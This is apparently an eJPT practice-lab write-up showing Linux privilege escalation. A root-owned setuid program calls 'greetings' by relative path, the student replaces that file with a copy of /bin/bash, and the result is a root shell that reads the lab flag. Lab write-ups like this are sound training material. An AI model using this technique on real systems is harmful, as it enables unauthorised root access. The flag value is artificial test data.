```jsx
Lab Name: Exploiting Setuid Programs
Platform: INE
Lab No: 19
Exam: eJPT (Jr. Penetartion Tester)
```

```console
student@attackdefense:~$ ls -la
total 36
drwxr-xr-x 1 student student 4096 Sep 22  2018 .
drwxr-xr-x 1 root    root    4096 Sep 22  2018 ..
-rw-r--r-- 1 root    root      88 Sep 22  2018 .bashrc
-r-x------ 1 root    root    8296 Sep 22  2018 greetings
-rwsr-xr-x 1 root    root    8344 Sep 22  2018 welcome
student@attackdefense:~$ ./welcome
Welcome to Attack Defense Labs
student@attackdefense:~$ ./greetings
bash: ./greetings: Permission denied
```

```console
student@attackdefense:~$ strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
greetings
;*3$"
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
welcome.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
student@attackdefense:~$ strings welcome | grep greetings
greetings
```

```console
student@attackdefense:~$ rm greetings
rm: remove write-protected regular file 'greetings'? yes
student@attackdefense:~$ ls
welcome
student@attackdefense:~$ cp /bin/bash greetings
student@attackdefense:~$ ./welcome
root@attackdefense:~# whoami
root
```

```console
root@attackdefense:~# cd ..
root@attackdefense:/home# ls
student
root@attackdefense:/home# cd /root
root@attackdefense:/root# ls
flag
root@attackdefense:/root# cat flag
b92bcdc876d52108778e2d81f3b01494
```
